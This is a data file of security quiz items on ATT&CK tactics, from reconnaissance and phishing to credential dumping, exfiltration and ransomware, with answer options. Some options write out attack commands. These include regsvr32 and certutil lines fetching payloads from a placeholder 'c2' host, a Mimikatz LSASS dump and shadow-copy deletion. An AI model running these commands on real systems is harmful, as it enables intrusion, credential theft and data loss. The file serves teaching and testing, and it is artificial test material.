questions.q: Which ATT&CK tactic ID covers Reconnaissance?
True or False: Passive reconnaissance (using Shodan, Censys, LinkedIn) sends traffic directly to the target and can trigger IDS alerts.
options: True — passive tools contact the target
False — passive recon queries public indexes, leaving no trace on the target

questions.q: APT29 (Cozy Bear) spent months in reconnaissance before the SolarWinds breach. What was their primary target in that recon phase?
options: SolarWinds' customer list and build pipeline
SolarWinds' CEO's personal email account

questions.q: True or False: Stripping metadata from public documents (T1592.002) is a defender action that reduces the attack surface during the recon phase.
options: True — metadata in PDFs can reveal author, software, and company details
False — document metadata is encrypted and cannot be read by attackers

questions.q: Which tool would an attacker use to enumerate subdomains and email addresses from public sources without touching the target?
options: theHarvester (passive OSINT aggregation)
nmap -sV (active service version scanning)

questions.q: Resource Development (TA0042) covers activities that happen before the attacker ever contacts a victim. Which technique involves registering lookalike domains and acquiring VPS servers?
options: T1583 — Acquire Infrastructure
T1566 — Phishing

questions.q: True or False: Certificate Transparency logs are a defender tool for detecting newly issued TLS certificates for lookalike domains before they are used in attacks.
options: True — CT logs are public and can be monitored for suspicious cert issuance
False — CT logs are private and only accessible to CAs

questions.q: Lazarus Group's Operation AppleJeus involved building fake cryptocurrency companies and trojanized software. Which ATT&CK technique best describes developing that custom malware?
options: T1587 — Develop Capabilities
T1584 — Compromise Infrastructure

questions.q: True or False: A newly registered domain with all WHOIS details hidden and a freshly issued certificate is considered low-risk in threat intelligence analysis.
options: True — new domains are common and should not be flagged automatically
False — new domain + hidden WHOIS + new cert is a high-risk pattern for attacker infrastructure

questions.q: What technique does JA3 TLS fingerprinting help defenders detect during the resource development and C2 operation phases?
options: Identifying C2 frameworks by their distinctive TLS handshake signature
Blocking all outbound TLS traffic from corporate endpoints

questions.q: According to Verizon DBIR data cited in this stage, what percentage of nation-state intrusions use spear phishing as the initial access technique?
options: Over 90%
Around 40%

questions.q: True or False: DMARC p=reject configured on a domain prevents attackers from spoofing that domain in phishing emails.
options: True — DMARC p=reject causes receiving mail servers to discard spoofed emails
False — DMARC only logs spoofing attempts but cannot block delivery

questions.q: In the 2016 DNC hack, APT28 gained access to John Podesta's credentials. What made the phishing email convincing?
options: It spoofed a Google security alert and linked to a pixel-perfect login clone
It was sent from a verified Google email address with an embedded malware attachment

questions.q: True or False: Seeing WINWORD.EXE spawning powershell.exe as a child process is expected system administration behavior and should not trigger an EDR alert.
options: True — Word uses PowerShell for macro execution in normal operation
False — this parent-child relationship is a high-fidelity indicator of spear phish exploitation

questions.q: Which email security technique routes links in emails through a proxy that checks destinations against threat intelligence before allowing the user to visit?
options: URL rewriting / time-of-click protection
DKIM signature verification

questions.q: PowerShell Script Block Logging (Event ID 4104) captures the decoded content of encoded PowerShell commands. What GPO setting enables it?
options: EnableScriptBlockLogging = 1 under the PowerShell ScriptBlockLogging registry path
EnableTranscription = 1 under the Windows Defender registry path

questions.q: True or False: LOLBins (Living-off-the-land binaries) like certutil.exe, mshta.exe, and regsvr32.exe are unsigned scripts that bypass antivirus.
options: True — LOLBins are custom attacker scripts that evade detection
False — LOLBins are legitimate signed Microsoft binaries abused to execute attacker code

questions.q: NotPetya caused $10B in global damage in 2017. Which execution techniques did it rely on to spread without dropping traditional malware?
options: WMI (T1047) and PsExec (T1569.002) — LOLBin-style legitimate Windows tools
Custom kernel exploits and unsigned driver installation

questions.q: True or False: PowerShell Constrained Language Mode (CLM) combined with AppLocker prevents most PowerShell-based execution techniques by restricting access to .NET types and COM objects.
options: True — CLM + AppLocker blocks most PowerShell attacker techniques
False — CLM only applies to interactive PowerShell sessions, not scripts

questions.q: An attacker uses the flag `-Enc` when running powershell.exe. What does this flag do and how do defenders decode it?
options: It base64-encodes the command to obfuscate it; Event ID 4104 captures the decoded content
It enables encrypted network communication; defenders must capture the traffic with Wireshark

questions.q: Which Windows Event ID signals that a new Scheduled Task has been created — a key persistence detection point?
options: Event ID 4698
Event ID 4624

questions.q: True or False: APT1 (Comment Crew) maintained access to victim networks for an average of 356 days, relying on layered persistence so that removing one mechanism still left others active.
options: True — APT1 used 20+ persistence techniques simultaneously across victims
False — APT1 was detected quickly; they relied on speed rather than persistence

questions.q: An attacker adds an entry to HKCU\Software\Microsoft\Windows\CurrentVersion\Run. Which ATT&CK sub-technique does this represent?
options: T1547.001 — Registry Run Keys / Startup Folder
T1053.005 — Scheduled Task/Job

questions.q: True or False: Finding and removing a single persistence mechanism (e.g., a malicious scheduled task) guarantees that the attacker has been fully evicted from the network.
options: True — once the scheduled task is removed, re-entry is blocked
False — sophisticated attackers layer multiple persistence mechanisms; find them all before declaring clean

questions.q: Which Sysinternals tool provides a comprehensive inventory of all persistence mechanisms on a Windows system, making it the gold standard for manual persistence hunting?
options: Autoruns.exe
Process Monitor (procmon.exe)

questions.q: Kerberoasting (T1558.003) targets service accounts in Active Directory. What does the attacker request, and what do they do with it offline?
options: Service tickets (TGS) encrypted with the service account's password hash, then crack them offline
Domain Controller replication data containing all NTLM hashes for all users

questions.q: True or False: DCSync (T1003.006) requires the attacker to physically access the Domain Controller to extract the NTDS.dit file.
options: True — NTDS.dit can only be copied with physical or RDP access to the DC
False — DCSync replicates AD password hashes remotely using DC replication rights, without touching the DC directly

questions.q: APT29's Golden SAML attack during the SolarWinds breach involved stealing which certificate from on-premises infrastructure?
options: The ADFS token-signing certificate, enabling forged SAML assertions for any M365 user
The Domain Controller's TLS certificate, enabling MITM on internal LDAP traffic

questions.q: True or False: Event ID 4769 with RC4 encryption type (etype 23) in Kerberos service ticket requests is a reliable detection indicator for Kerberoasting.
options: True — modern environments should use AES; RC4 service tickets indicate offline cracking attempts
False — RC4 Kerberos tickets are standard in all Active Directory environments

questions.q: Golden SAML bypasses which critical security control that organizations rely on to protect Microsoft 365 accounts?
options: Multi-Factor Authentication (MFA), because the forged SAML token is trusted without credential verification
Firewall egress filtering, because SAML tokens travel over HTTP

questions.q: BYOVD (Bring Your Own Vulnerable Driver) is a defense evasion technique. What does it allow attackers to do that standard user-mode evasion cannot?
options: Operate at kernel privilege to patch EDR callbacks, disabling the EDR from the kernel level
Bypass Windows Firewall rules by routing traffic through the driver

questions.q: True or False: certutil.exe making outbound HTTP connections is expected normal behavior on Windows enterprise endpoints.
options: True — certutil regularly contacts Microsoft servers to validate certificates
False — certutil.exe should not make outbound network connections; this indicates LOLBin abuse

questions.q: ALPHV/BlackCat used a vulnerable Dell driver (DBUtil_2_3.sys) to kill EDR sensors before deploying ransomware. Which defense specifically blocks BYOVD attacks?
options: HVCI (Hypervisor-Protected Code Integrity) with a strict driver allowlist
Windows Defender real-time protection with signature updates

questions.q: True or False: Sysmon Event ID 3 (Network Connection) can detect LOLBin abuse when tools like certutil.exe or mshta.exe make unexpected outbound network connections.
options: True — Sysmon logs all network connections with the process image path, revealing LOLBin network activity
False — Sysmon Event ID 3 only captures connections from unsigned executables

questions.q: Which LOLBin technique (T1218.010) allows an attacker to execute a remote COM scriptlet without writing a traditional executable to disk?
options: regsvr32.exe /s /n /u /i:http://c2/payload.sct scrobj.dll
certutil.exe -urlcache -split -f http://c2/payload.exe

questions.q: Mimikatz's `sekurlsa::logonpasswords` command dumps credentials from which Windows process?
options: LSASS (Local Security Authority Subsystem Service)
winlogon.exe (Windows Logon Application)

questions.q: True or False: Enabling Windows Credential Guard moves LSASS credentials into a Virtualization-Based Security enclave, preventing Mimikatz from dumping them.
options: True — Credential Guard isolates LSASS secrets in a VBS enclave inaccessible to standard Mimikatz
False — Credential Guard only protects domain credentials, not local account hashes

questions.q: NotPetya spread via a credential cascade. What made admin credential reuse across systems so devastating in that attack?
options: Compromising one system with a cached admin credential gave access to every other system that admin had touched
The attacker had access to a zero-day that bypassed authentication on all Windows systems

questions.q: True or False: WDigest authentication storing plaintext passwords in LSASS memory is enabled by default on modern Windows 10/Server 2016+ systems.
options: True — WDigest is always enabled and cannot be disabled
False — WDigest is disabled by default on modern Windows; attackers must re-enable it via a registry key

questions.q: Which Sysmon event ID and access mask combination best detects an unauthorized process reading LSASS memory (credential dumping)?
options: Event ID 10 (Process Access) targeting lsass.exe with GrantedAccess mask 0x1010
Event ID 4625 (Logon Failure) with SubStatus 0xC000006A

questions.q: Pass-the-Hash (T1550.002) allows an attacker to authenticate to remote systems without knowing the plaintext password. What does the attacker use instead?
options: The NTLM hash directly as the authentication credential
A forged Kerberos TGT ticket generated from the password hash

questions.q: True or False: In modern enterprise environments, seeing Event ID 4624 with Logon Type 3 (Network) using NtLmSsp (NTLM) authentication is a red flag for Pass-the-Hash activity.
options: True — network logons should use Kerberos; pure NTLM network logons are suspicious
False — NTLM network logons are standard and expected in all Active Directory environments

questions.q: Colonial Pipeline's 2021 ransomware attack started with a compromised VPN account. What single security control, if in place, would most likely have prevented the initial lateral movement?
options: Multi-Factor Authentication (MFA) on the VPN account
A next-generation firewall with deep packet inspection

questions.q: True or False: Restricting NTLM network authentication (via Group Policy) and forcing Kerberos prevents Pass-the-Hash because PtH only works with the NTLM authentication protocol.
options: True — PtH exploits NTLM; forcing Kerberos eliminates the attack path
False — Pass-the-Hash works equally well with Kerberos tickets

questions.q: CrackMapExec is used by attackers to spray an NTLM hash across an entire subnet. What does a successful response from a target host indicate?
options: The hash is valid and the account has admin rights on that target host
The target host has SMB signing disabled and is vulnerable to relay attacks

questions.q: APT29 (Midnight Blizzard) collected emails from Microsoft's corporate environment in 2023–2024 using a legacy OAuth application. What made this possible?
options: The legacy OAuth app had excessive Microsoft Graph API permissions (Mail.Read for all users) and was never revoked
APT29 exploited a zero-day in Microsoft Exchange's on-premises server

questions.q: True or False: Running `net view /domain`, `nltest /dclist`, and `arp -a` from an internal host are examples of ATT&CK Discovery techniques that use built-in Windows tools.
options: True — these native commands enumerate domain computers and network topology (TA0007)
False — these are administrative tools that attackers cannot use without special permissions

questions.q: An attacker runs a PowerShell script that collects all .docx, .xlsx, and .pdf files modified in the last 90 days and compresses them with a password. Which ATT&CK tactic does this represent?
options: TA0009 Collection — specifically T1119 Automated Collection
TA0010 Exfiltration — specifically T1048 Exfiltration Over Alternative Protocol

questions.q: True or False: A SIEM rule alerting when a single account reads more than 500 files in under 5 minutes is an effective detection for automated collection scripts.
options: True — this volume-based anomaly is a reliable indicator of automated bulk file access
False — 500 files per 5 minutes is within normal range for document management systems

questions.q: APT29 specifically searched collected emails for keywords like 'APT29' and 'Midnight Blizzard'. What type of intelligence operation does this represent?
options: Counter-intelligence collection — gathering data about what defenders know about the attacker
Double extortion preparation — identifying executives to threaten with data publication

questions.q: Equifax's 76-day undetected exfiltration was enabled by a single control failure. What was it?
options: An SSL inspection certificate had expired 19 months earlier, making encrypted exfiltration invisible to monitoring
The IDS signature database had not been updated, missing the attack pattern

questions.q: True or False: DNS tunneling exfiltration (T1048.003) is easily blocked by most enterprise firewalls because DNS traffic on port 53 is denied by default.
options: True — enterprise firewalls block outbound DNS by default
False — DNS is almost always permitted outbound, making DNS tunneling a preferred covert exfiltration channel

questions.q: Which network characteristic of DNS exfiltration traffic makes it detectable in firewall or DNS logs?
options: Unusually long subdomain labels (>50 characters) containing base32/base64-encoded data
High-volume UDP traffic on non-standard ports above 1024

questions.q: True or False: Splitting exfiltrated data across 20 different destination IPs (as the Equifax attackers did) is an effective technique to stay below per-host volume anomaly detection thresholds.
options: True — distributing traffic across many IPs makes each individual stream appear low-volume
False — total egress volume is always tracked; splitting IPs does not help evade detection

questions.q: Which exfiltration technique (T1567) blends stolen data with legitimate cloud traffic, making it harder to block without disrupting business operations?
options: Uploading to public cloud services like Dropbox, Google Drive, or Mega.nz
Using ICMP echo request/reply packets to carry encoded data

questions.q: REvil used Kaseya VSA, an RMM platform, to deploy ransomware to 1,500 businesses simultaneously. Which ATT&CK technique describes this supply chain amplification?
options: T1195.002 — Compromise Software Supply Chain (via MSP/RMM platform)
T1486 — Data Encrypted for Impact (ransomware encryption only)

questions.q: True or False: Deleting Volume Shadow Copies (vssadmin delete shadows /all) before encrypting files is a universal pre-step for ransomware deployments, detectable via Event ID 4688.
options: True — VSS deletion removes recovery options and appears in process creation logs
False — modern ransomware skips VSS deletion because Windows 10 protects shadow copies by default

questions.q: What makes immutable backups (e.g., AWS S3 Object Lock in COMPLIANCE mode) effective against ransomware that has Domain Admin access?
options: Immutable backup objects cannot be deleted or overwritten even by admin accounts during the retention period
They are stored on-premises in an air-gapped server the ransomware cannot reach over the network

questions.q: True or False: The Kaseya VSA attack was timed for the July 4th holiday weekend. This timing is coincidental and not a standard ransomware operator tactic.
options: True — ransomware deploys automatically regardless of the time of day or week
False — attackers deliberately target holidays and weekends to exploit reduced IT staffing and slow incident response

questions.q: Modern ransomware groups practice 'double extortion.' What is the second layer of pressure beyond encrypting files?
options: Threatening to publicly publish the exfiltrated data if the ransom is not paid
Launching a DDoS attack against the victim's public website to amplify disruption
